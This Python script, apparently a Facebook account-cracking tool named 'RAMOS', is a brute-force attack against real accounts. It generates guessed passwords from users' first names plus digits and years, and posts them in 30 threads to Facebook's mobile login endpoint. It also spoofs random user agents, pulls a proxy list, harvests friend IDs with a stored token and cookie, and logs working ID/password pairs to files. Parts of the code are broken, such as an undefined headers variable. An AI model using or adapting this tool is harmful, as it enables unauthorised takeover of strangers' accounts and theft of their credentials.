#ramos
import requests, bs4, json, os, sys, random, datetime, time, re
from concurrent.futures import ThreadPoolExecutor as tred

from time import localtime as lt

# ------------------[ hockar army ]-------------------#
import os, platform, time, sys

print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
time.sleep(5)
#time.sleep(2)
#os.system(f'xdg-open ')
# ------------------[ hockar Army ]-------------------#
# ------------------[ USER-AGENT ]-------------------#

ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
try:
    prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt', 'w').write(prox)
except Exception as e:
    pass
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = (f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)

    aa = 'Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'


def uaku():
    try:
        ua = open('bbnew.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua = open('bbnew.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('bbnew.txt', 'r').read().splitlines()


# ------------[ INDICATION ]---------------#
id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], [], [], []
cokbrut = []
pwpluss, pwnya = [], []

# ------------[ Cyber- ]--------------#

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
asu = random.choice([m, k, h, u, b])

###----------[ ANSII COLOR STYLE ]---------- ###

Z = "\x1b[0;90m"  # Hitam
M = "\x1b[38;5;196m"  # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m"  # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"  # Ungu
O = "\x1b[0;96m"  # Biru Muda
P = "\x1b[38;5;231m"  # Putih
J = "\x1b[38;5;208m"  # Jingga
A = "\x1b[38;5;248m"  # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###

Z2 = "[#000000]"  # Hitam
M2 = "[#FF0000]"  # Merah
H2 = "[#00FF00]"  # Hijau
K2 = "[#FFFF00]"  # Kuning
B2 = "[#00C8FF]"  # Biru
U2 = "[#AF00FF]"  # Ungu
N2 = "[#FF00FF]"  # Pink
O2 = "[#00FFFF]"  # Biru Muda
P2 = "[#FFFFFF]"  # Putih
J2 = "[#FF8F00]"  # Jingga
A2 = "[#AAAAAA]"  # Abu-Abu

# --------------------[ CONVERTER-BULAN ]--------------#

dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August',
       '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July',
        '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
date = str(tgl) + '/' + str(bln) + '/' + str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = "PM"
else:
    a = ltx
    tag = "AM"


# ------------------[ MACHINE-SUPPORT ]---------------#

def alvino_xy(u):
    for e in u + "\n": sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)


def clear():
    os.system('clear')


def back():
    login()


def contact():

    back()


def linex():
    print('\033[1;37m')


def animation(u):
    for e in u + "\n": sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)




def login():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0],
                              cookies={'cookie': cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()


def login_lagi334():
    try:
        os.system('clear')

        ses = requests.Session()

    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()


# ------------------[ MENU ]----------------#
# ===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
            
logo =("""
\x1b[1;94m ̾B̾a̾̾x̾̾e̾̾r̾ ̾b̾̾e̾ ̾b̾̾o̾ ̾t̾̾o̾̾o̾̾l̾̾e̾ ̾r̾a̾̾m̾̾o̾̾s̾""")

def menu():
    os.system('clear')
    print(logo)
    print(f"""\033[97;1m[\033[92;1m1\033[32;1m] \x1b[1;91mCRACK FILE """)
    print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""")
    
    CYBER = input('\x1b[1;92m[+] CHOOSE: ')
    if CYBER in ['111']:
        login()
        dump_massal()
    elif CYBER in ['1']:
        crack_file()
    elif CYBER in ['2', '02']:
        os.system("python nono.py")
    elif CYBER in ['3', '03']:
        result()
    elif CYBER in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        animation(' [×] SELECT CORRECTLY ')
        back()

    # -----------------[ HASIL-CRACK ]-----------------#


def result():
    os.system('clear')
    print(logo)
    print(' \033[97;1m[\033[92;1m1\033[97;1m] CHECK CP IDZ ')
    print(' \033[97;1m[\033[92;1m2\033[97;1m] CHECK OK IDZ ')
    print(' \033[97;1m[\033[92;1m3\033[97;1m] EXIT ')
    kz = input(' \033[97;1m[\033[92;1m•\033[97;1m]CHOOSE : ')
    if kz in ['1', '01']:
        try:
            vin = os.listdir('CP')
        except FileNotFoundError:
        
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin) == 0:

            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('CP/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 10:
                    nom = '' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print('\033[0;91m==================')
                    print(' ' + nom + '. ' + isi + '\033[31m ' + str(len(hem)) + ' \033[0m CP ' + x)
                else:
                    lol.update({str(cih): str(isi)})
                    print(' ' + str(cih) + '. ' + isi + '\033[31m ' + str(len(hem)) + ' \033[0m CP ' + x)
            print('\033[0;91m==================')
            geeh = input(' \033[97;1m[\033[92;1m✓\033[97;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:
                geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:
                lin = open('CP/' + geh, 'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split('|')
                print(f' \033[97;1m[\033[92;1m•\033[97;1m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp += 1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2', '02']:
        try:
            vin = os.listdir('OK')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin) == 0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open('OK/' + isi, 'r').readlines()
                except:
                    continue
                cih += 1
                if cih < 100:
                    print('\033[0;91m==================')
                    nom = '' + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    print(' ' + nom + '. ' + isi + '\033[32m ' + str(len(hem)) + ' \033[0m OK ' + x)
                else:
                    lol.update({str(cih): str(isi)})
                    print(' ' + str(cih) + '. ' + isi + '\033[32m ' + str(len(hem)) + ' \033[0m OK ' + x)
            print('\033[0;91m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\033[0;91m==================')
            try:
                geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:
                lin = open('OK/' + geh, 'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split('|')
                print(f'\033[97;1m[\033[92;1m•\033[97;1m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp += 1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0', '00']:
        back()
    else:
        print('\033[0;91m==================')
        animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()


# -------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except IOError:
        exit()
    try:
        print('\033[0;91m==================')
        jum = int(input(' \033[97;1m[\033[92;1m•\033[97;1m] ENTER TARGET AMOUNT  : '))
        print('\033[0;91m==================')
    except ValueError:
        print('\033[0;91m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum < 1 or jum > 100000000:
        print('\033[0;91m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        kl = input(' \033[97;1m[\033[92;1m•\033[97;1m] INPUT UID ' + str(yz) + ' : ')
        uid.append(kl)
    for userr in uid:
       # try:
            col = ses.get(
                'https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0],
                cookies={'cookies': cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id'] + '|' + mi['name'])
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue

            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print(f' \033[97;1m[\033[92;1m•\033[97;1m] TOTAL ID : \u001b[36m' + str(len(id)) + '\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError, IOError):
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()


# -------------[ CRACK-FROM-FILE ]------------------#

def crack_file():
    print('\033[1;32m[ Put File Example:  /sdcard/namefile.txt]')
    
    o = input('\033[97;1m[\033[92;1m+\033[97;1m] INPut FILE NAME :\033[92;1m ')
    try:
        lin = open(o).read().splitlines()
    except:
        animation(' [×] FILE NOT FOUND🥲')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()


# -------------[ PENGATURAN-IDZ ]---------------#

def setting():

  #  print("\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mFB KON")
  #  print("\033[97;1m[\033[92;1m2\033[97;1m] FB TAZA")
    print("\033[97;1m[\033[92;1m3\033[32;1m] \033[0;92mCRACK RANDOM")
    
    hu = input('\033[97;1m[\033[92;1m+\033[97;1m]CHOOSE :\033[92;1m ')
    if hu in ['1', '01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2', '02']:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = (bcm - 1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ['3', '03']:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    print("\033[97;1m[\033[32;1m1\033[97;1m] METHOD 1 [\033[0;92m\033[0;91m\033[1;37m]")
    
#    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    # os.system("xdg-open https://www.facebook.com/Cyber.Army0033")
    if hc in ['1', '01']:
        method.append('mobile')
    elif hc in ['2', '02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit()


# -------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
    os.system('clear')
    print(" \x1b[1;94mawe crack bka ba xere mna😂😂")
    print(" \x1b[1;94m𝑨𝑳𝑳 𝑰𝑫 𝑪𝑶𝑳𝑳𝑬𝑪𝑻𝑬𝑫 : "+str(len(id)))
    print(" \x1b[1;94m♲︎===============================================♲︎")
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'2005')
                    pwv.append(frs+'2006')
                    pwv.append(frs+'2007')
                    pwv.append(frs+'2008')
                    pwv.append(frs+'2009')
                    pwv.append(frs+'2010')
                    pwv.append(frs+'2011')
                    pwv.append(frs+'2012')
                    pwv.append(frs+'2013')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'123@')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'112233')
                    pwv.append(frs+frs)
                    pwv.append(frs+'0000')
                    pwv.append(frs+' '+frs)
                    pwv.append('123'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('12345'+frs)
                    pwv.append(frs+'1234567')
                    pwv.append(frs+'12345678')
                    pwv.append(frs+'123456789')
                    pwv.append(frs+'1234567890')
                    pwv.append(frs+'123'+frs)
                    pwv.append(frs+'1234'+frs)
                    pwv.append(frs+frs+frs)
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'2005')
                    pwv.append(frs+'2006')
                    pwv.append(frs+'2007')
                    pwv.append(frs+'2008')
                    pwv.append(frs+'2009')
                    pwv.append(frs+'2010')
                    pwv.append(frs+'2011')
                    pwv.append(frs+'2012')
                    pwv.append(frs+'2013')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'123@')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'112233')
                    pwv.append(frs+frs)
                    pwv.append(frs+'0000')
                    pwv.append(frs+' '+frs)
                    pwv.append('123'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('12345'+frs)
                    pwv.append(frs+'1234567')
                    pwv.append(frs+'12345678')
                    pwv.append(frs+'123456789')
                    pwv.append(frs+'1234567890')
                    pwv.append(frs+'123'+frs)
                    pwv.append(frs+'1234'+frs)
                    pwv.append(frs+frs+frs)
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree, idf, pwv)
            else:
                pool.submit(crackfree, idf, pwv)
    os.system("python nono.py")
    exit()()


# --------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(
        f"\r{Z}[RAMOS]{P} {Z}[{Z}\x1b[1;97m{loop}{Z}]—{Z}[{H}OK/{ok}{Z}]—[{K}CP/{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get(
                'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": idf,
                     "next": "https://p.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pw, }
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            headeheade = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"iOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (iPod; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.163 Mobile/15E148 Safari/604.1',
    'viewport-width': '980,'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                          cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'''\n\x1b[1;93m┏ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┓
  ◊ - 𝑰𝑫 ➛ {idf}\n
  ◊ - 𝑷𝑾 ➛ {pw}\n
┗ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┛
⪧ 𝑩𝒀 :   @r92a3 x RAMOS-CP		''')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'''\n\x1b[1;92m┏ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┓
  \n◊ - 𝑰𝑫 ➛ {idf}
  \n◊ - 𝑷𝑾 ➛ {pw}
\n┗ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┛
⪧ 𝑩𝒀 :   @r92a3 x RAMOS-OK		''')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# ------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(
        f"\r{Z}[ROZH]{P} {Z}[{Z}\x1b[1;97m{loop}{Z}]—{Z}[{H}OK/{ok}{Z}]—[{K}CP/{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip = random.choice(prox)
            proxs = {'http': 'socks4://' + nip}
            ses.headers.update({"Host": 'm.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get(
                'https://m.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": idf,
                     "next": "https://p.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": pw, }
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"iOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (iPod; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.163 Mobile/15E148 Safari/604.1',
    'viewport-width': '980,'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                          cookies={'cookie': koki}, headers=heade, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•BATA-Cp] {idf} + {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/' + cpc, 'a').write(idf + ' • ' + pw + '\n')
                akun.append(idf + ' • ' + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•RAMOS-Ok] {idf} • {pw} ')
                os.system('espeak -a 150 " Ok,  Cyber,  id"')
                open('OK/' + okc, 'a').write(idf + ' + ' + pw + '\n')
                break

            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1


# -----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__ == '__main__':
    try:
        os.mkdir('OK')
    except:
        pass
    try:
        os.mkdir('CP')
    except:
        pass
    try:
        os.system('touch .prox.txt')
    except:
        pass
menu()